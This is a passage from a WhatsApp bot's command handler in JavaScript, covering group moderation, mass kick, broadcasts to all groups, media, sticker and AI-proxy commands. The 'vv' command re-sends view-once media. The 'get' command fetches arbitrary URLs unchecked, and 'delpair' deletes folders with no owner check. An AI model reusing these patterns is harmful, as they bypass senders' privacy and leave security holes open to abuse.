    if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
            let [poll, opt] = text.split("|")
            if (text.split("|").length < 2)
return await reply(
`State the question and at least 2 options\nExample: ${prefix}poll am i trust?|yes,no, maybe...`
)
            let options = []
            for (let i of opt.split(',')) {
options.push(i)
            }
            await kaneki.sendMessage(m.chat, {
poll: {
name: poll,
values: options
}
            })
        }
        break;
case'tagall':{
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
if (!isCreator) return m.reply("for my owner only.");
        if (!m.isGroup) return reply(mess.group);
        const textMessage = args.join(" ") || "ᴀʟʟ ʜᴀɪʟ ᴅᴇᴍᴍʏ";
        let teks = `\`mf tagall\` :\n> *${textMessage}*\n\n`;

        const taGroupMeta = await kaneki.groupMetadata(m.chat);
        const taParticipants = taGroupMeta.participants;

        for (let mem of taParticipants) {
            teks += `@${mem.id.split("@")[0]}\n`;
        }

        kaneki.sendMessage(m.chat, {
            text: teks,
            mentions: taParticipants.map((a) => a.id)
        }, { quoted: m });
      }
      break;
case 'hidetag': {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
if (!isCreator) return m.reply("for my owner only.");
if (!m.isGroup) return reply(mess.group);
kaneki.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
}
break;
case 'promote': {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT');
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins ) return reply('you are not an admin!!')
if (!isBotAdmins) return reply('_Bot is not an admin_')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await kaneki.groupParticipantsUpdate(m.chat, [users], 'promote')
await reply(`Done`)
}
break
case 'demote': {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
if (!isAdmins) return reply('Admins ony!!')
if (!isBotAdmins) return reply('_bot is not an admin_')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await kaneki.groupParticipantsUpdate(m.chat, [users], 'demote')
await reply(`Done`)
}
break;
case 'mute': {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
    if (!m.isGroup) return reply('Groupchat only');
    if (!isAdmins) return reply('Admins only');
    if (!isBotAdmins) return reply('Bot must be an admin');

    try {
        await kaneki.groupSettingUpdate(m.chat, 'announcement'); // Mute group
        reply('_Group has been muted._\nOnly admins can send messages now.');
    } catch (error) {
        console.error(error);
        reply('Failed to mute the group. Please try again.');
    }
}
break;
case 'unmute': {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
    if (!m.isGroup) return reply('𝐠𝐜 𝐨𝐧𝐥𝐲.');
    if (!isAdmins) return reply('`𝐚𝐝𝐦𝐢𝐧𝐬 𝐨𝐧𝐥𝐲`');

    try {
        await kaneki.groupSettingUpdate(m.chat, 'not_announcement'); // Unmute group
        reply('Group has been unmuted.\nEveryone can send messages now.');
    } catch (error) {
        console.error(error);
        reply(' Failed to unmute the group. Please try again.');
    }
}
        break;
case 'left': {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
if (!isCreator) return m.reply("for Owner only.");
await kaneki.groupLeave(m.chat)
await reply(`Done`)
            }
            break;
case 'add': {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
if (!isCreator) return m.reply(" Owner only.");
if (!m.isGroup) return reply(mess.only.group)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await kaneki.groupParticipantsUpdate(m.chat, [users], 'add')
await reply(`Done`)
}
break;
case 'kick': {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
if (!m.quoted) return reply("tag a user to kick them");
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins ) return reply('admins only!!')
if (!isBotAdmins) return reply('_Bot must be admin_')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await kaneki.groupParticipantsUpdate(m.chat, [users], 'remove')
await reply(`Done`)
}

break;      
case 'delete': case 'del': {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
   if (!isCreator) return reply("Owner only.");
if (!m.quoted) throw false
 kaneki.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break;
            case 'linkgroup': case 'linkgc': case 'gclink': case 'grouplink': {
            if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bot must be admin_')
let response = await kaneki.groupInviteCode(m.chat)
kaneki.sendMessage(m.chat, { text: `https://chat.whatsapp.com/${response}\n\nGroup Link : ${groupMetadata.subject}` }, { quoted: m })
            }
            break;
 case 'join': {
 if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
 if (!isCreator) return reply("owner only.");
if (!text) return reply(`example ${prefix+command} linkgc`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply('Link Invalid!')
let result = args[0].split('https://chat.whatsapp.com/')[1]
await kaneki.groupAcceptInvite(result)
await reply(`Done`)
}
break;
case 'tag':
case 'totag': {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins) return reply('*admins only')
if (!isBotAdmins) return reply('_Bot must be admin first_')
               if (!m.quoted) return reply(`Reply message with caption ${prefix + command}`)
               kaneki.sendMessage(m.chat, { forward: m.quoted, mentions: participants.map(a => a.id) })
               }
break;

case 'setppgroup': case 'setppgrup': case 'setppgc': {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
if (!isCreator) return m.reply('owner only')
if (!m.isGroup) throw mess.group
if (!isAdmins) throw mess.admin
if (!/image/.test(mime)) throw `thrim/Reply Image  Caption ${prefix + command}`
if (/webp/.test(mime)) throw `thrim/Reply Image  Caption ${prefix + command}`
let media = await kaneki.downloadAndSaveMediaMessage(m)
await kaneki.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
m.reply('done')
}
break;
case 'checkidch': case 'idch': {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
if (!text) return reply("example : idch - link of channel")
if (!text.includes("https://whatsapp.com/channel/")) return reply("Link is not valid bro ")
let result = text.split('https://whatsapp.com/channel/')[1]
let res;
try {
  res = await kaneki.newsletterMetadata("invite", result);
} catch (e) {
  return reply(`Failed to fetch channel info: ${e.message}`);
}
if (!res) return reply("Could not retrieve channel info.");
let teks = `
* *ID :* ${res.id}
* *Name :* ${res.name}
* *Follower:* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Verified" : "No"}
`
return reply(teks)
}
break;
//========================================================\\
 case 'tagme': {
     if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
     if (!isCreator) return m.reply('owner only')
     if (!m.isGroup) throw mess.group
     let menst = [m.sender];
     kaneki.sendMessage(m.chat, { 
         text: `@${m.sender.split('@')[0]}`,  
         mentions: menst        
     }
   )   
 }
break;
case 'hd':
  case 'remini':{
  if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
if (!m.quoted) return reply(`Where is the picture?`)
			if (!/image/.test(mime)) return reply(`Send/Reply Photo With caption ${prefix + command}`)
			try {
			const { remini } = require('./lib/remini')
			let media = await quoted.download()
			let proses = await remini(media, "enhance")
			kaneki.sendMessage(m.chat, { image: proses, caption: `_Success in Making ${command}_`}, { quoted: m})
			} catch {
			  reply('erro bro')
			}
			}

       break;
       
       case "kickall":
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
if (!isCreator) return m.reply("Owner only.");
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins) return m.reply(mess.admin)
let users = participants.filter((u) => !areJidsSameUser(u.id, kaneki.user.id)); 
   let kickedUser = []; 
   for (let user of users) { 
     if (user.id.endsWith("@s.whatsapp.net") && !user.admin) { 
       await kickedUser.push(user.id); 
       await sleep(1 * 1000); 
     } 
   } 
   if (kickedUser.length < 1) 
     return m.reply("In this group there are no members except you and me"); 
   const res = await kaneki.groupParticipantsUpdate(m.chat, kickedUser, "remove"); 
   await sleep(3000); 
   await m.reply( 
     `sucessfully kicked member\n${kickedUser.map( 
       (v) => "@" + v.split("@")[0] 
     )}`, 
     null, 
     { 
       mentions: kickedUser, 
     } 
   ); 
break;
// 'toimg' case already handled above
  
    case 'setbotpp':
            case 'setpp':
            case 'setppbot':
            if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
                if (!isCreator) return reply("owner only");
                if (!quoted) return reply(`Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return reply(`Reply Image With Caption ${prefix + command}`)
                if (/webp/.test(mime)) return reply(`Reply Image With Caption ${prefix + command}`)
                var medis = await kaneki.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await kaneki.query({
                        tag: 'iq',
                        attrs: {
                            to: botNumber,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    reply('Done ✅')
                } else {
                    var memeg = await kaneki.updateProfilePicture(botNumber, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    reply('Done ✅')
                }
break;
case "autoreact": {
  if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
  if (!isCreator) return m.reply("Owner only.");
  const arArgs = text.trim().toLowerCase().split(/\s+/);
  const arToggle = arArgs[0];
  const arTarget = arArgs[1]; // optional: 'all'

  if (!arToggle || !["on", "off"].includes(arToggle)) {
    return reply(
      '*autoreact* usage:\n' +
      `• *${prefix}autoreact on* — enable in this chat\n` +
      `• *${prefix}autoreact off* — disable in this chat\n` +
      `• *${prefix}autoreact on all* — enable in ALL active chats\n` +
      `• *${prefix}autoreact off all* — disable in ALL active chats`
    );
  }

  if (!global.autoReact) global.autoReact = {};

  if (arTarget === 'all') {
    // toggle all currently tracked chats
    Object.keys(global.autoReact).forEach(k => { global.autoReact[k] = arToggle === 'on'; });
    // also set the current chat
    global.autoReact[m.chat] = arToggle === 'on';
  } else {
    global.autoReact[m.chat] = arToggle === 'on';
  }

  // Persist to disk
  try { fs.writeFileSync('./system/autoreact.json', JSON.stringify(global.autoReact)); } catch(_) {}

  const scope = arTarget === 'all' ? 'all chats' : 'this chat';
  return reply(arToggle === 'on'
    ? `✅ *Auto-react ON* for ${scope} — I'll react with random emojis to every message 💨`
    : `❌ *Auto-react OFF* for ${scope}`
  );
}
break;
// ─── AUTOREAD TOGGLE ─────────────────────────────────────────────────────────
case 'autoread': {
  if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
  if (!isCreator) return m.reply('Owner only.');
  const arSwitch = text.trim().split(' ')[0].toLowerCase();
  if (!arSwitch || !['on', 'off'].includes(arSwitch)) {
    return reply('Usage: *autoread on* or *autoread off*');
  }
  global.autoread = arSwitch === 'on';
  try { fs.writeFileSync('./system/autoread.json', JSON.stringify({ enabled: global.autoread })); } catch(_) {}
  return reply(global.autoread
    ? '✅ *Auto-read ON* — all messages will be marked as seen.'
    : '❌ *Auto-read OFF* — messages will no longer be auto-read.'
  );
}
break;
// ─── AUTOLIKE (STATUS REACT) TOGGLE ──────────────────────────────────────────
case 'autolike': {
  if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
  if (!isCreator) return m.reply('Owner only.');
  const alSwitch = text.trim().split(' ')[0].toLowerCase();
  if (!alSwitch || !['on', 'off'].includes(alSwitch)) {
    return reply('Usage: *autolike on* or *autolike off*');
  }
  global.autoLike = alSwitch === 'on';
  try { fs.writeFileSync('./system/autolike.json', JSON.stringify({ enabled: global.autoLike })); } catch(_) {}
  return reply(global.autoLike
    ? `✅ *Auto-like ON* — reacting to all statuses with random emojis:\n${STATUS_LIKE_EMOJIS.join(' ')}`
    : '❌ *Auto-like OFF* — status reactions disabled.'
  );
}
break;
case 'broadcastimage': case 'bcimage': case 'broadcastvideo': case 'broadcastvid':
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
if (!isCreator) return m.reply("Owner only.");
        if (!q) return reply(`reply to an image with your desired text `)
        let getGroups = await kaneki.groupFetchAllParticipating()
        let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
        let xeoncast = groups.map(v => v.id)
        reply(` Posting in ${xeoncast.length} Group chat, deep ${(xeoncast.length * 1.5).toFixed(0)} second`)
        for (let i of xeoncast) {
let txt = `${ownername}'s Broadcast\n\nMessage : ${q}`
let media = await quoted.download()
if(/image/.test(mime)) {
await kaneki.sendMessage(i, { image: media, caption: txt, mentions: participants.map(a => a.id) })
} else if(/video/.test(mime)){
await kaneki.sendMessage(i, { video: media, caption: txt, mentions: participants.map(a => a.id) })
}
            }
        reply(`The results are broadcast in the group ${xeoncast.length}`)      
break;
case 'listonline': {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
if (!isCreator) return m.reply("Owner only.");
        if (!m.isGroup) return reply(mess.grouponly);
        kaneki.sendMessage(from, { react: { text: "💨", key: m.key } })
        let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
        let presenceData = store.presences && store.presences[id] ? Object.keys(store.presences[id]) : []
        let online = [...presenceData, botNumber]
        let liston = 1
        kaneki.sendMessage(m.chat, { text: ' 「Online Members」\n\n' + online.map(v => `${liston++} . @` + v.replace(/@.+/, '')).join('\n'), mentions: online }, { quoted: m })
      }
break;
case 'tovn': {
  if (!quoted) return reply('Reply to a video or voice message to convert to audio.');
  if (!/video|audio/.test(mime)) return reply('Media type not supported. Please reply to a video or voice note.');

  try {
    let media = await quoted.download();
    await kaneki.sendMessage(m.chat, {
      audio: media,
      mimetype: 'audio/mpeg',
      ptt: false
    }, { quoted: m });
  } catch (e) {
    reply('Failed to convert media to audio.');
  }
}
break;
case 'qc': {
  if (!text) return m.reply('Use format: *.qc your quote*');

  const name = m.pushName || 'User';
  const quote = text.trim();

  let profilePic;
  try {
    profilePic = await kaneki.profilePictureUrl(m.sender, 'image');
  } catch {
    profilePic = 'https://telegra.ph/file/6880771c1f1b5954d7203.jpg'; // fallback
  }

  const url = `https://www.laurine.site/api/generator/qc?text=${encodeURIComponent(quote)}&name=${encodeURIComponent(name)}&photo=${encodeURIComponent(profilePic)}`;

  try {
    await kaneki.sendImageAsSticker(m.chat, url, m, {
      packname: global.packname,
      author: global.author
    });
  } catch (err) {
    console.error('Quote card sticker generation error:', err);
    m.reply('Oops! Failed to create your quote sticker.');
  }
}
break;
case 'ai': {
  if (!text) return m.reply('Example: .ai who are you?');

  await kaneki.sendPresenceUpdate('composing', m.chat);

  try {
    const { data } = await axios.post("https://chateverywhere.app/api/chat/", {
      model: {
        id: "gpt-4",
        name: "GPT-4",
        maxLength: 32000,
        tokenLimit: 8000,
        completionTokenLimit: 5000,
        deploymentName: "gpt-4"
      },
      messages: [{ pluginId: null, content: text, role: "user" }],
      prompt: text,
      temperature: 0.5
    }, {
      headers: {
        "Accept": "*/*",
        "User-Agent": "RadiationMD WhatsApp Bot"
      }
    });

    await kaneki.sendMessage(m.chat, {
      text: `╭─❍ *AI Assistant*\n│\n│ *Q:* ${text}\n│\n│ *A:*\n│ ${data}\n│\n╰─✅ _Wanna ask smth?_`
    }, { quoted: m });

  } catch (e) {
    await m.reply(`AI encountered a problem: ${e.message}`);
  }
}
break;
case 'radiateai': {
  if (!text) return m.reply('Example: .radiateai whats cookin?');

  await kaneki.sendPresenceUpdate('composing', m.chat);

  try {
    const { data } = await axios.post("https://chateverywhere.app/api/chat/", {
      model: {
        id: "gpt-4",
        name: "GPT-4",
        maxLength: 32000,
        tokenLimit: 8000,
        completionTokenLimit: 5000,
        deploymentName: "gpt-4"
      },
      messages: [{ pluginId: null, content: text, role: "user" }],
      prompt: text,
      temperature: 0.6
    }, {
      headers: {
        "Accept": "*/*",
        "User-Agent": "Radiation WhatsApp Bot"
      }
    });

    await kaneki.sendMessage(m.chat, {
      text: `╭─❍ *Radiate AI*\n│\n│ *Question:* ${text}\n│\n│ *Answer:*\n│ ${data}\n│\n╰─ _With kindness, your assistant!_`
    }, { quoted: m });

  } catch (e) {
    await m.reply(`radiation had an error: ${e.message}`);
  }
}
break;
case 'unblock': case 'unblocked': {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
	 if (!isCreator) return m.reply("Owner only.");
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await kaneki.updateBlockStatus(users, 'unblock')
		await reply(`Done`)
	}
	break;
	case 'block': case 'blocked': {
	if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
	 if (!isCreator) return m.reply("Owner only.");
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await kaneki.updateBlockStatus(users, 'block')
		await reply(`Done`)
			}
	break;
case 'creategc': case 'creategroup': {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
 if (!isCreator) return m.reply("Owner only.");
if (!args.join(" ")) return reply(`Use ${prefix+command} groupname`)
try {
let cret = await kaneki.groupCreate(args.join(" "), [])
let response = await kaneki.groupInviteCode(cret.id)
teks = ` 「 Create Group 」
▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Africa/Lagos").format("DD/MM/YYYY HH:mm:ss")}

https://chat.whatsapp.com/${response}
  `
kaneki.sendMessage(m.chat, { text:teks, mentions: parseMention(teks)}, {quoted:m})
} catch {
reply("done!")
}
}
break;
// 'brat' case already handled above
  case 'furbrat': {
  if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
            if (!q) return reply(`Send command with text. ${prefix + command} kaneki`)
            const imageUrl = `https://fastrestapis.fasturl.link/tool/furbrat?text=${q}`
            await makeStickerFromUrl(imageUrl, kaneki, m);
        }
       break;
case 'tourl': {    
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
    let q = m.quoted ? m.quoted : m;
    if (!q || !q.download) return m.reply(`Reply to an Image or Video with command ${prefix + command}`);
    
    let mime = q.mimetype || '';
    if (!/image\/(png|jpe?g|gif)|video\/mp4/.test(mime)) {
        return reply('Only images or MP4 videos are supported!');
    }

    let media;
    try {
        media = await q.download();
    } catch (error) {
        return reply('Failed to download media!');
    }

    const uploadImage = require('../system/Data6');
    const uploadFile = require('../system/Data7');
    let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime);
    let link;
    try {
        link = await (isTele ? uploadImage : uploadFile)(media);
    } catch (error) {
        return reply('Failed to upload media!');
    }

    kaneki.sendMessage(m.chat, {
        text: `[\`\`\`HERE IS THE URL BY 🇨 🇪 🇳 🇹 🇮 🇵 🇪 🇩 🇪 -ᴍᴅ]\`\`\` \n*© KEN ɪɴᴄ* \n ${link}`
    }, { quoted: m });
}
break;
case 'vv': {
if (!isCreator) return m.reply("Owner only.");
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
    if (!m.quoted) return reply('Please reply to an image, video, or voice note.');

    try {
        // Download the quoted media
        const mediaBuffer = await kaneki.downloadMediaMessage(m.quoted);

        if (!mediaBuffer) {  
            return reply('⚠️ Failed to download media. Try again.\n_ʙʏ 🇨 🇪 🇳 🇹 🇮 🇵 🇪 🇩 🇪  ᴍᴅ_');  
        }  

        // Determine the media type  
        const mediaType = m.quoted.mtype;  

        if (mediaType === 'imageMessage') {  
            await kaneki.sendMessage(m.chat, {   
                image: mediaBuffer,   
                caption: "💨_ʜᴇʀᴇs ʏᴏᴜʀ ɪᴍᴀɢᴇ\n_ʙʏ 🇨 🇪 🇳 🇹 🇮 🇵 🇪 🇩 🇪 -ᴍᴅ_"   
            }, { quoted: m });
        } else if (mediaType === 'videoMessage') {  
            await kaneki.sendMessage(m.chat, {   
                video: mediaBuffer,   
                caption: "✅ Here's the video\n_ʙʏ 🇨 🇪 🇳 🇹 🇮 🇵 🇪 🇩 🇪 -ᴍᴅ_"   
            }, { quoted: m });
        } else if (mediaType === 'audioMessage') {  
            await kaneki.sendMessage(m.chat, {   
                audio: mediaBuffer,   
                mimetype: 'audio/ogg', // Ensures proper voice note playback  
                ptt: true, // Sends it as a voice note  
                caption: "✅ Here's the voice note\n_ʙʏ 🇨 🇪 🇳 🇹 🇮 🇵 🇪 🇩 🇪 -ᴍᴅ_"   
            }, { quoted: m });
        } else {  
            return reply('⚠️ Unsupported format. Please reply to an image, video, or voice note.\n_ʙʏ 🇨 🇪 🇳 🇹 🇮 🇵 🇪 🇩 🇪 -ᴍᴅ_');  
        }
    } catch (error) {
        console.error('Error:', error);
        await reply('⚠️ An error occurred. Try again.\nUse .save if this doesnt work\n_ʙʏ 🇨 🇪 🇳 🇹 🇮 🇵 🇪 🇩 🇪 -ᴍᴅ_');
    }
}
break;
//== ban function by kaneki == //
case "ban": case "banuser": {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
if (!isCreator) return m.reply("Owner only.");
if (m.quoted || text) {
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (ban.includes(orang)) return m.reply(`*User ${orang.split('@')[0]} is already banned 💨*`)
await ban.push(orang)
await fs.writeFileSync("./start/lib/banned.json", JSON.stringify(ban))
m.reply(`\`\`\`user ${orang.split('@')[0]} banned from using the bot 💨\`\`\``)
} else {
return m.reply(example("/@tag/234XXX/reply to chat"))
}}
break;
case "unban": case "unbanuser":  {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
if (!isCreator) return m.reply("Owner only.");
if (m.quoted || text) {
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (!ban.includes(orang)) return m.reply(`\`\`\`User ${orang.split('@')[0]} not found in banlist 💨\`\`\``)
let indx = ban.indexOf(orang)
await ban.splice(indx, 1)
await fs.writeFileSync("./start/lib/banned.json", JSON.stringify(ban))
m.reply(`user  ${orang.split('@')[0]} unbanned your free to use the bot`)
} else {
return m.reply(example("@tag/234XX/reply to chat"))
}}
break
case "listban": case "listbanuser": {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
if (!isCreator) return m.reply("Owner only.");
if (ban.length < 1) return m.reply("no banned users yet ")
let teksnya = `here are the banned user\n`
ban.forEach(e => teksnya += `* @${e.split("@")[0]}\n`)
await kaneki.sendMessage(m.chat, {text: teksnya, mentions: [... ban]}, {quoted: m})
}
break;
// end ban function by kaneki
case 'closetime': {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins) return reply('admin first!')
if (!isBotAdmins) return reply('_Bot must be admin first💨_')
if (args[1] == 'second') {
var timer = args[0] * 1000
} else if (args[1] == 'minute') {
var timer = args[0] * 60000
} else if (args[1] == 'hour') {
var timer = args[0] * 3600000
} else if (args[1] == 'day') {
var timer = args[0] * 86400000
} else {
return reply('*Choose:*\nsecond\nminute\nhour\n\n*Example*\n10 second')
}
reply(`Close Time ${q} Starting from now`)
setTimeout(() => {
const close = `*On time* Group Closed By Admin\nNow Only Admins Can Send Messages`
kaneki.groupSettingUpdate(from, 'announcement')
reply(close)
}, timer)
}
break;

case 'opentime': {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins) return reply('admins only')
if (!isBotAdmins) return reply('Bot must be admin first💨 _')
if (args[1] == 'second') {
var timer = args[0] * 1000
} else if (args[1] == 'minute') {
var timer = args[0] * 60000
} else if (args[1] == 'hour') {
var timer = args[0] * 3600000
} else if (args[1] == 'day') {
var timer = args[0] * 86400000
} else {
return reply('*Choose:*\nsecond\nminute\nhour\n\n*Example*\n10 second')
}
reply(`Open Time ${q} Starting from now`)
setTimeout(() => {
const open = `*On time* Group Opened By Admin\n Now Members Can Send Messages`
kaneki.groupSettingUpdate(from, 'not_announcement')
reply(open)
}, timer)
}
break;
            case 'resetlinkgc':
case 'resetlinkgroup':
case 'resetlinkgrup':
case 'revoke':
case 'resetlink':
case 'resetgrouplink':
case 'resetgclink':
case 'resetgruplink': {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bots Must Be Admins First_')
if (!isAdmins) return reply('Admin only!!')
kaneki.groupRevokeInvite(m.chat)
}
break;
case 'everyone': 
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
 kaneki.sendMessage(m.chat, {
text: "everyone" + m.chat,
contextInfo: {
groupMentions: [
{
groupJid: m.chat,
groupSubject: 'kallmetrust'
}
]
}
}
)
break;
case 'getpp':{
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
let userss = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let ghosst = userss
	try {
   var ppuser = await kaneki.profilePictureUrl(ghosst, 'image')
} catch (err) {
   var ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
kaneki.sendMessage(from, { image: { url: ppuser }}, { quoted: m })
}
break;
case "get": {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
if (!(/^https?:\/\//.test(text))) return m?.reply('Prefix *URL* with http:// or https://')
let linknyaurl = await shorturl(text)
let _url = new URL(text)
let url = `${_url.origin}${_url.pathname}${_url.search}`;
let res;
try { res = await axios.get(url, { responseType: 'arraybuffer', validateStatus: () => true }); } catch(e) { return m?.reply(`Fetch error: ${e.message}`) }
const contentLength = parseInt(res.headers['content-length'] || '0');
if (contentLength > 100 * 1024 * 1024 * 1024) {
m?.reply(`File too large: ${contentLength} bytes`)
return
}
const contentType = res.headers['content-type'] || '';
if (!/text|json/.test(contentType)) return reply(`*Link:* ${linknyaurl}`)
let txt;
try { txt = util.format(JSON.parse(Buffer.from(res.data).toString())); } catch (e) { txt = Buffer.from(res.data).toString(); }
m?.reply(txt.slice(0, 65536) + '')
}
break
case 'autobio':
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
       if (!isCreator) return m.reply("Owner only.");
                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    autobio = true
                    global.autobio = true
                    try { fs.writeFileSync('./system/autobio.json', JSON.stringify({ enabled: true })); } catch(_) {}
                    reply(`Successfully Changed AutoBio To ${q}`)
                } else if (q == 'off') {
                    autobio = false
                    global.autobio = false
                    try { fs.writeFileSync('./system/autobio.json', JSON.stringify({ enabled: false })); } catch(_) {}
                    reply(`Successfully Changed AutoBio To ${q}`)
                }
                break;
                case 'delpair':
  if (!q) return reply(`Example: ${prefix + command} 234xxx`);
  const dirPath = './lib2/pairing/';
  const folderName = fs.readdirSync(dirPath).find((file) => {
    return file.endsWith(`${q}@s.whatsapp.net`);
  });
  if (!folderName) return reply(`Folder not found: ${q}`);
  try {
    fs.rmdirSync(path.join(dirPath, folderName), { recursive: true });
    reply(`pair number deleted Successfully: ${folderName}`);
  } catch (err) {
    reply(`Error deleting paired device ${err.message}`);
  }
break;
 case 'addowner': case 'addown': {
 if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
    if (!isCreator) return m.reply("Owner only.");
    let number = qtext.replace(/[^0-9]/g, '');
    let checkNumber = await kaneki.onWhatsApp(number + "@s.whatsapp.net");
    if (!checkNumber.length) return m.reply("Invalid number!");

    owner.push(number);
    Premium.push(number);
    fs.writeFileSync('./system/owner.json', JSON.stringify(owner));
    fs.writeFileSync('./system/premium.json', JSON.stringify(Premium));

    m.reply("Owner added successfully.");
}
break;
case 'delowner': case 'delown': {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
    if (!isCreator) return m.reply("Owner only.");
    if (!args[0]) return m.reply(`Usage: ${command} 234xxx`);

    let number = qtext.replace(/[^0-9]/g, '');
    owner.splice(owner.indexOf(number), 1);
    Premium.splice(Premium.indexOf(number), 1);

    fs.writeFileSync('./system/owner.json', JSON.stringify(owner));
    fs.writeFileSync('./system/premium.json', JSON.stringify(Premium));

    m.reply("Owner removed successfully.");
}
        break;
case 'addpremium': case 'addprem': {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
    if (!isCreator) return m.reply(" Owner only!");
    if (!args[0]) return m.reply(`Usage: ${prefix + command} 234xxx`);

    let number = qtext.split("|")[0].replace(/[^0-9]/g, '');
    let ceknum = await kaneki.onWhatsApp(number + "@s.whatsapp.net");
    if (!ceknum.length) return m.reply("Invalid number!");

    Premium.push(number);
    fs.writeFileSync('./system/premium.json', JSON.stringify(Premium));

    m.reply("Success! User added to premium.");
}
break;
case 'delpremium': case 'delprem': {
